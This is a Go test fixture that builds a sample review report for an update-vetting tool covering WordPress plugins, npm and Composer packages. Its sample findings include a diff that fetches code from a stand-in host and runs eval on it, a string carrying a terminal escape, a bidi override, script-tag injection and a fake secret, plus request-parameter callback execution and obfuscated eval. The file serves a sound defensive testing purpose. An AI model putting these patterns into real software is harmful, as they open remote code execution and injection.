// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package coretest

import (
	"strings"
	"time"

	"github.com/RhythmShahriar/rhythm/kit/cli"
	"github.com/RhythmShahriar/sightread/core"
)

// SampleTime is the start time of SampleReport.
var SampleTime = time.Date(2026, 10, 26, 9, 12, 3, 0, time.UTC)

// SampleReport returns a report every writer golden is made from: one
// update per verdict, every catalogue signal at least once, an allowed,
// a baselined, an ignored, a demoted and a raised finding, a Not
// checked entry, an error and a fleet update. Its package text holds
// what writers must neutralise: an escape byte, a bidi override, HTML,
// Markdown and a fake secret. It is built fresh on every call, so a test
// may change it.
func SampleReport() *core.Report {
	sha := func(c string) string { return strings.Repeat(c, 64) }
	side := func(v string, by core.VerifiedBy, released time.Time) core.Side {
		return core.Side{Version: v, Source: "wordpress.org", URL: "https://downloads.wordpress.org/plugin/sample." + v + ".zip",
			SHA256: sha(v[:1]), HashKind: core.HashManifest, Verified: by, Method: "every file matches wordpress.org checksums (SHA-256)",
			Released: released, Publisher: []string{"sampleauthor"}}
	}
	finding := func(id, file string, line int, evidence string) core.Finding {
		info, _ := core.Signal(id)
		return core.Finding{ID: id, Title: info.Title, Severity: info.Severity, Confidence: info.Confidence,
			File: file, Line: line, EndLine: line, Evidence: core.NewSnippet(evidence), Advice: "Review " + id + " before you update."}
	}

	hold := core.Update{Eco: core.WPPlugin, Name: "countdown-timer-ultimate",
		From: side("2.6.7", core.ByChecksums, SampleTime.AddDate(0, -5, 0)), To: side("2.6.8", core.ByChecksums, SampleTime.AddDate(0, 0, -2)),
		Installed: core.InstalledInfo{Path: "wp-content/plugins/countdown-timer-ultimate"},
		Verdict:   core.Hold,
		Diff:      core.DiffStats{FilesChanged: 14, FilesAdded: 1, LinesAdded: 2184, LinesRemoved: 12, BytesFrom: 421888, BytesTo: 441344},
		Changelog: []core.ChangelogEntry{{Version: "2.6.8", Text: "Check compatibility with WordPress 6.8", Generic: true}},
		Hunks: []core.Hunk{{Path: "includes/class-wpos-analytics.php", OldStart: 80, OldLines: 2, NewStart: 80, NewLines: 4,
			Lines: []string{" function wpos_init() {", "+  $b = wp_remote_get('https://analytics.wpos-cdn.example/v2/p');", "+  eval($b['body']);", " }"}}},
	}
	hold.To.Latest, hold.To.Wanted = true, true
	review := core.Update{Eco: core.NPM, Name: "@acme/widgets",
		From: core.Side{Version: "1.4.0", Source: "registry.npmjs.org", SHA256: sha("1"), HashKind: core.HashArchive, Verified: core.BySignature},
		To: core.Side{Version: "1.5.0", Source: "registry.npmjs.org", SHA256: sha("2"), HashKind: core.HashArchive, Verified: core.BySignature,
			Wanted: true, Constraint: "^1.4.0"},
		Installed: core.InstalledInfo{Lockfile: "package-lock.json", LockLine: 42},
		Verdict:   core.Review,
	}
	routine := core.Update{Eco: core.Composer, Name: "monolog/monolog",
		From:      core.Side{Version: "3.12.0", Source: "packagist.org", SHA256: sha("3"), HashKind: core.HashArchive, Verified: core.ByShasum},
		To:        core.Side{Version: "3.12.1", Source: "packagist.org", SHA256: sha("4"), HashKind: core.HashArchive, Verified: core.ByShasum},
		Installed: core.InstalledInfo{Lockfile: "composer.lock", LockLine: 7},
		Verdict:   core.Routine, FromCache: true,
	}
	allowed := core.Update{Eco: core.WPPlugin, Name: "wordfence",
		From: side("7.11.6", core.ByChecksums, SampleTime.AddDate(0, -1, 0)), To: side("7.11.7", core.ByChecksums, SampleTime.AddDate(0, 0, -9)),
		Verdict: core.Allowed,
	}
	unverified := core.Update{Eco: core.WPTheme, Name: "astra",
		From: side("4.8.0", core.ByTLS, SampleTime.AddDate(0, -2, 0)), To: side("4.8.1", core.ByNone, time.Time{}),
		Verdict: core.Unverified,
		Errors:  []core.ErrorEntry{{Eco: core.WPTheme, Name: "astra", Code: core.EUnverifiable, Message: "couldn't verify astra 4.8.1: wordpress.org checksums answered 503"}},
	}
	fleet := core.Update{Eco: core.WPPlugin, Name: "wpforms-lite",
		From: side("1.9.1", core.ByChecksums, SampleTime.AddDate(0, -1, 0)), To: side("1.9.2", core.ByChecksums, SampleTime.AddDate(0, 0, -20)),
		Verdict: core.Routine, Sites: []string{"brochure", "shop"},
	}

	// Hostile package text, so every writer golden shows it neutralised.
	hostile := "\x1b[31mred\u202etxt.php <script>alert(1)</script> [link](https://evil.example) @team token " + FakeKey(KeyNPM)

	for _, s := range core.Catalog {
		var f core.Finding
		switch s.ID {
		case "remote-fetch-exec":
			f = finding(s.ID, "includes/class-wpos-analytics.php", 88, "wp_remote_get('https://analytics.wpos-cdn.example/v2/p') → eval($body)")
			f.EndLine, f.Domains = 104, []string{"analytics.wpos-cdn.example"}
		case "secret-added":
			f = finding(s.ID, "includes/config.php", 3, "define('API_KEY', '"+FakeKey(KeyStripe)+"');")
		case "unicode-hidden":
			f = finding(s.ID, "includes/admin.php", 12, hostile)
		default:
			f = finding(s.ID, "includes/"+s.ID+".php", 10, s.ID+" evidence")
		}
		switch {
		case s.Severity == cli.SeverityCritical:
			hold.Findings = append(hold.Findings, f)
		case s.Severity >= cli.SeverityMedium:
			review.Findings = append(review.Findings, f)
		default:
			routine.Findings = append(routine.Findings, f)
		}
	}
	// One finding of each kind of treatment.
	raised := finding("eval-dynamic", "includes/loader.php", 20, "$f = $_GET['cb']; $f();")
	raised.Severity, raised.RaisedBy = cli.SeverityCritical, []string{"owner-change"}
	demoted := finding("obfuscation", "assets/js/vendor.min.js", 1, "var _0x1a2b=['\\x65\\x76\\x61\\x6c'];")
	demoted.Severity, demoted.Demoted = cli.SeverityMedium, "vendored path"
	baselined := finding("outbound-new-domain", "includes/api.php", 30, "https://api.acme.example/v1")
	baselined.Baselined = true
	ignored := finding("outbound-new-domain", "src/Internal/Admin/RemoteInboxNotifications/feed.php", 5, "https://inbox.woo.example")
	ignored.Ignored = true
	below := finding("bot-cloaking", "includes/seo.php", 40, "if (strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot'))")
	below.BelowConfidence = true
	hold.Findings = append(hold.Findings, raised)
	review.Findings = append(review.Findings, demoted, baselined, ignored, below)
	cron := finding("cron-new-hook", "includes/cron.php", 8, "wp_schedule_event(time(), 'hourly', 'wordfence_scan')")
	cron.Allowed = &core.AllowMatch{By: "Rhythm Shahriar", Reason: "new cron hook is the scheduled scan, checked the code", Date: "2026-10-20", Source: ".sightread/allowed.yaml"}
	allowed.Findings = []core.Finding{cron}
	for _, u := range []*core.Update{&hold, &review, &routine, &allowed} {
		for i := range u.Findings {
			f := &u.Findings[i]
			f.Fingerprint = core.Fingerprint(u.Eco, u.Name, u.To.Version, f.ID, f.File, f.Evidence)
		}
	}

	r := &core.Report{
		Kind:          core.KindReview,
		Target:        core.Target{Path: "/var/www/shop", Kind: "mixed", WordPress: "6.8.3", Sites: []string{"brochure", "shop"}},
		Started:       SampleTime,
		Duration:      8120 * time.Millisecond,
		SignalPack:    "2026.10.24",
		NamesPack:     "2026.10.24",
		FailOn:        "high",
		MinConfidence: "likely",
		Updates:       []core.Update{hold, review, routine, allowed, unverified, fleet},
		NotChecked: []core.NotChecked{{Eco: core.WPPlugin, Name: "gravityforms", Version: "2.8.1", Reason: core.NotWPOrg,
			Text: "not on WordPress.org", Hint: "give the vendor's zip with --to-file"}},
		Warnings: []string{"local-drift: wp-mail-smtp on disk is not the 4.1.1 wordpress.org ships"},
		Errors:   []core.ErrorEntry{{Eco: core.NPM, Name: "left-pad", Code: core.ENetwork, Message: "can't reach registry.npmjs.org (no such host)"}},
		Notes:    []string{"--skip-roadie-verify was used"},
	}
	FakeScorer{}.Summarise(r)
	return r
}
